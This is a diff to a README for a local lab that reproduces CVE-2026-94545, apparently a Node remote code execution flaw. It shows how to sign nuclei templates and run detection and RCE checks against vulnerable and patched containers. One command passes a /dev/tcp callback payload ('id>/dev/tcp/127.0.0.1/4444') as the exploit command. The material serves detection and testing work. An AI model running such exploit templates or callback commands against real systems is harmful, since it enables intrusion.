@@ -76,19 +76,45 @@ The lab is the target, not the tool: nothing here replaces nuclei. The intended 
 # terminal 1
 cd lab && ./setup.sh && ./start.sh
 
-# terminal 2 - real nuclei, real interactsh
-nuclei -u http://127.0.0.1:3000 -t CVE-2026-94545.yaml
-nuclei -u http://127.0.0.1:3000 -t CVE-2026-94545-rce.yaml
-
-# negative control
-nuclei -u http://127.0.0.1:3001 -t CVE-2026-94545.yaml          # no match expected
-nuclei -u http://127.0.0.1:3001 -t CVE-2026-94545-rce.yaml      # gate stops it
-
-# without interactsh, with your own callback
-nuclei -u http://127.0.0.1:3000 -t CVE-2026-94545-rce.yaml \
-       -var 'cmd=bash -c "id>/dev/tcp/127.0.0.1/4444"'
-tail -f lab/oob-hits.log
+# terminal 2 - real nuclei: signs copies, runs detection, then the exploit
+./run-nuclei.sh                          # lab target on :3000
+./run-nuclei.sh http://127.0.0.1:3000 --no-rce
+./run-nuclei.sh http://127.0.0.1:3000 --oast 127.0.0.1:4444      # local callback
+./run-nuclei.sh http://127.0.0.1:3000 --cmd 'bash -c "id>/dev/tcp/127.0.0.1/4444"'
 ```
+
+Manual equivalent, if you prefer to drive nuclei yourself:
+
+```bash
+# nuclei v3 refuses unsigned javascript: templates, so sign first (twice on a
+# fresh machine: the first call only generates ~/.config/nuclei/keys)
+nuclei -sign -t CVE-2026-94545.yaml && nuclei -sign -t CVE-2026-94545.yaml
+nuclei -sign -t CVE-2026-94545-rce.yaml && nuclei -sign -t CVE-2026-94545-rce.yaml
+
+nuclei -u http://127.0.0.1:3000 -t CVE-2026-94545.yaml            # expect a match
+nuclei -u http://127.0.0.1:3001 -t CVE-2026-94545.yaml            # expect nothing
+nuclei -u http://127.0.0.1:3000 -t CVE-2026-94545-rce.yaml        # interactsh callback
+nuclei -u http://127.0.0.1:3001 -t CVE-2026-94545-rce.yaml        # gate stops it
+```
+
+Signing edits the file (a `# digest:` line is appended), so sign a copy if you want to keep
+the repository file pristine — that is exactly what `run-nuclei.sh` does under `.signed/`.
+
+### Running against a containerised lab
+
+The same templates work against the advisory's Docker image (`docker build -t cve-2026-94545 .`
+then `docker run -d -p 3000:3000 cve-2026-94545`):
+
+* verify the container is up with `sudo docker ps` and `curl -s http://127.0.0.1:3000/`
+  (the entrypoint script is for the container, not for the host — do not run it locally);
+* the exploit replaces the Node process, and in that image Node is PID 1, so **the container
+  exits after a successful chain**. That is the expected result, not a failure. Bring it back
+  with `sudo docker start cve-2026-94545`;
+* the default callback uses interactsh, so the container needs outbound internet. For a fully
+  local callback use `--oast <host-ip>:<port>`, where `<host-ip>` must be reachable *from
+  inside the container* (podman rootful bridge gateway, e.g. `10.88.0.1`; rootless slirp4netns
+  uses `10.0.2.2`; `--network=host` also works) and a listener such as `./oob-listener.py`
+  is running there.
 
 If the target's worker is replaced by the exploit, `./start.sh --restart vulnerable`
 brings it back.
